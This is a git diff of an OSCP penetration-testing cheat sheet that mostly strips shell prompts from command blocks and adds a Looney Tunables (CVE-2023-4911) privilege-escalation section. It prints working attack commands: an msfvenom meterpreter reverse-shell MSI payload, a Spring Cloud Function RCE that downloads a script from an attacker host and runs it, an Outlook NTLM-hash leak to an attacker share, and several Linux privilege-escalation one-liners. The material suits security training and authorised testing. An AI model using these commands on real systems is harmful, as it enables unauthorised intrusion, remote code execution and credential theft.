@@ -162,6 +162,7 @@ Thank you for reading.
 		- [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/OSCP#cve-2023-22809-sudo-bypass)
 		- [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/OSCP#cve-2023-23397-microsoft-outlook-click-to-run-pe-0-day-powershell-implementation)
 		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/OSCP#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
+  		- [CVE-2023-4911: Looney Tunables LPE](https://github.com/0xsyr0/OSCP#cve-2023-4911-looney-tunables-lpe)
   		- [GodPotato LPE](https://github.com/0xsyr0/OSCP#godpotato-lpe)
 		- [Juicy Potato LPE](https://github.com/0xsyr0/OSCP#juicy-potato-lpe)
   		- [JuicyPotatoNG LPE](https://github.com/0xsyr0/OSCP#juicypotatong-lpe)
@@ -3701,7 +3702,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
 
 ```c
-$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> -f msi > <FILE>.msi
 ```
 
 ```c
@@ -4004,7 +4005,7 @@ python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746e
 #### Port Scanning
 
 ```c
-$ export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
+export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
 ```
 
 #### powercat
@@ -4117,10 +4118,10 @@ Enter-PSSession $offsec_session
 ##### Execute Command as another User
 
 ```c
-PS C:\> $SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
-PS C:\> $Session = New-PSSession -Credential $Cred
-PS C:\> Invoke-Command -Session $session -scriptblock { whoami }
+$SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
+$Session = New-PSSession -Credential $Cred
+Invoke-Command -Session $session -scriptblock { whoami }
 ```
 
 or
@@ -4177,7 +4178,7 @@ pwncat-cs -lp <LPORT>
 #### rpcclient
 
 ```c
-$ rpcclient -U "" <RHOST>
+rpcclient -U "" <RHOST>
 ```
 
 ```c
@@ -4291,7 +4292,7 @@ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
 
 ```c
 !root:
-$ sudo -u#-1 /bin/bash
+sudo -u#-1 /bin/bash
 ```
 
 #### CVE-2020-1472: ZeroLogon PE
@@ -4448,7 +4449,7 @@ impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
 ##### Vulnerability Test
 
 ```c
-$ sudoedit -s /
+sudoedit -s /
 ```
 
 The machine is vulnerable if one of the following message is shown.
@@ -4497,11 +4498,11 @@ su rootz
 > https://github.com/me2nuk/CVE-2022-22963
 
 ```c
-$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
+curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl <LHOST>/<FILE>.sh -o /dev/shm/<FILE>")' --data-raw 'data' -v
 ```
 
 ```c
-$ curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
+curl -X POST http://<RHOST>/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /dev/shm/<FILE>")' --data-raw 'data' -v
 ```
 
 #### CVE-2022-30190: MS-MSDT Follina RCE
@@ -4770,15 +4771,15 @@ while True:
 #### First Terminal
 
 ```c
-$ ./firejoin_py.bin
+./firejoin_py.bin
 You can now run 'firejail --join=193982' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
 ```
 
 #### Second Terminal
 
 ```c
-$ firejail --join=193982
-$ su
+firejail --join=193982
+su
 ```
 
 #### CVE-2023-21746: Windows NTLM EoP LocalPotato LPE
@@ -4865,8 +4866,8 @@ sudoedit /etc/motd
 #### CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)
 
 ```c
-PS C:\> Import-Module .\CVE-2023-23397.ps1
-PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
+Import-Module .\CVE-2023-23397.ps1
+Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<FILE>.wav" -meetingsubject "<SUBJECT>" -meetingbody "<TEXT>"
 ```
 
 #### CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)
@@ -4874,8 +4875,24 @@ PS C:\> Send-CalendarNTLMLeak -recipient "<EMAIL>" -remotefilepath "\\<LHOST>\<F
 - Linux ubuntu2204 5.19.0-46-generic
 
 ```c
-$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
-setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
+```
+
+#### CVE-2023-4911: Looney Tunables LPE
+
+```c
+python3 gen_libc.py 
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+```c
+gcc -o exp exp.c
+./exp
 ```
 
 #### GodPotato LPE
@@ -4974,12 +4991,12 @@ $RESULT | ogv
 > https://www.exploit-db.com/exploits/1518
 
 ```c
-$ gcc -g -c raptor_udf2.c -fPIC
-$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ```
 
 ```c
-$ mysql -u root
+mysql -u root
 ```
 
 ```c
